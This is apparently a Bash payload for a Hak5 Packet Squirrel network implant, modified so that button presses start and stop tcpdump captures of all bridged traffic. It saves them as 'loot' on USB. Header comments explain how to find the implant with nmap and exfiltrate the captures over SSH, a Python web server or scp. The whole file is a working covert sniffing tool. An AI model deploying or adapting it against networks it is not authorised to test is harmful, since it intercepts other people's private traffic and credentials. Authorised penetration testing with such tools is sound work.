#!/bin/bash
# 
# Title:        TCPDump (Interactive & Looping)
# Description:  Bridge mode with Web UI. Press button to start, press again to stop. Loops for multiple captures.
# Author:       Hak5 / Modified
# Version:      3.0
# Category:     sniffing
# Target:       Any
# Net Mode:     BRIDGE

# ============================================================================
# EXFILTRATION & ACCESS NOTES
# ============================================================================
# IMPORTANT: In BRIDGE mode, the Squirrel gets a dynamic IP from the network.
# 
# HOW TO FIND THE SQUIRREL'S IP:
# 1. Scan the local subnet (e.g., nmap -sn 192.168.1.0/24). Look for open 
#    Port 22 (SSH) or a Hak5 MAC address (00:13:37:...).
# 2. Check the target router's DHCP Client / Connected Devices list.
#
# EXFIL OPTION 1: PYTHON WEB SERVER (Browser Download)
# 1. SSH into the Squirrel: ssh root@<SQUIRREL_IP>
# 2. Run: cd /usb/loot/tcpdump/
# 3. Run: python3 -m http.server 8080
# 4. Open a web browser to http://<SQUIRREL_IP>:8080 and download files.
#
# EXFIL OPTION 2: SCP (Terminal Download)
# 1. Open your computer's local terminal (Command Prompt/PowerShell/Bash).
# 2. Run: scp -r root@<SQUIRREL_IP>:/usb/loot/tcpdump/ .
# ============================================================================

function monitor_space() {
    # Safely monitors USB space and kills tcpdump if it drops below 10MB
    while true; do
        if [[ $(USB_FREE) -lt 10000 ]]; then
            kill $1
            sync
            LED G SUCCESS
            break
        fi
        sleep 5
    done
}

function finish() {
    # Kill TCPDump and sync filesystem
    kill $1
    wait $1 2>/dev/null
    sync

    # Indicate successful capture stop
    LED G SUCCESS
}

function run() {
    # 1. Set networking to BRIDGE mode
    NETMODE BRIDGE
    sleep 5

    # 2. Activate the Web UI
    UI_START
    
    # Create loot directory once
    mkdir -p /usb/loot/tcpdump &> /dev/null

    # --- THE LOOP STARTS HERE ---
    while true; do
        # Indicate readiness (Waiting for button press to start)
        LED SETUP 
        
        # 3. Wait for FIRST button press to start capture
        NO_LED=true BUTTON

        # Indicate active packet capture
        LED ATTACK
        
        # Start tcpdump. The date command ensures a new file name every time it loops!
        tcpdump -i br-lan -s 0 -w /usb/loot/tcpdump/dump_$(date +%Y-%m-%d-%H%M%S).pcap &>/dev/null &
        tpid=$!
        
        # Monitor USB space in the background
        monitor_space $tpid &
        monitor_pid=$!

        # 4. Wait for SECOND button press to stop capture
        NO_LED=true BUTTON
        
        # Stop the space monitor and finish the capture
        kill $monitor_pid 2>/dev/null
        finish $tpid
        
        # Briefly show the solid green success LED for 2 seconds before looping back to SETUP (yellow)
        sleep 2
    done
}

# Wait for the USB drive
USB_WAIT

# Start the main routine
run &

wait
